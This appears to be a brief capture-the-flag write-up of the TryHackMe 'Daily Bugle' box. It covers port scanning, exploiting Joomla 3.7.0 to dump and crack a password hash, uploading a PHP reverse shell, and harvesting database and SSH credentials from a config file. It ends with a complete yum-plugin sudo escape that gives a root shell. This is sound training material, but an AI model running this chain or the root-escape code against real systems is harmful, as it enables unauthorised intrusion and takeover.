Daily Bugle
----
nmap scan :
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
----
gobuster scan
/images               (Status: 301) [Size: 236] [--> http://10.10.131.171/images/]
/index.php            (Status: 200) [Size: 9280]                                  
/media                (Status: 301) [Size: 235] [--> http://10.10.131.171/media/] 
/templates            (Status: 301) [Size: 239] [--> http://10.10.131.171/templates/]
/modules              (Status: 301) [Size: 237] [--> http://10.10.131.171/modules/]  
/bin                  (Status: 301) [Size: 233] [--> http://10.10.131.171/bin/]      
/plugins              (Status: 301) [Size: 237] [--> http://10.10.131.171/plugins/]  
/includes             (Status: 301) [Size: 238] [--> http://10.10.131.171/includes/] 
/language             (Status: 301) [Size: 238] [--> http://10.10.131.171/language/] 
/components           (Status: 301) [Size: 240] [--> http://10.10.131.171/components/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.131.171/cache/]     
/libraries            (Status: 301) [Size: 239] [--> http://10.10.131.171/libraries/] 
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.131.171/tmp/]       
/layouts              (Status: 301) [Size: 237] [--> http://10.10.131.171/layout
/administrator






----
http://10.10.131.171/administrator/manifests/files/joomla.xml
looking at joomla dir we found that joomla version is 3.7.0
<version>3.7.0</version>
found a github that has exploit 
https://github.com/stefanlucas/Exploit-Joomla
after running the .py program we got some creds!
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

let's try to crack that hash!
creds: John:jonah:spiderman123
--
we are in joomla!
---
then we uploaded our .php reverse shell to a template and ran it and got reverse shell
----
in /var/www/html/configuration.php file we found creds?
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash

public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
---
creds ssh:jjames:nv5uz9r3ZEDzVjNu
---
privesc:
----
running sudo -l we get that user can run yum as root
checking gtfo
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
we are root :D 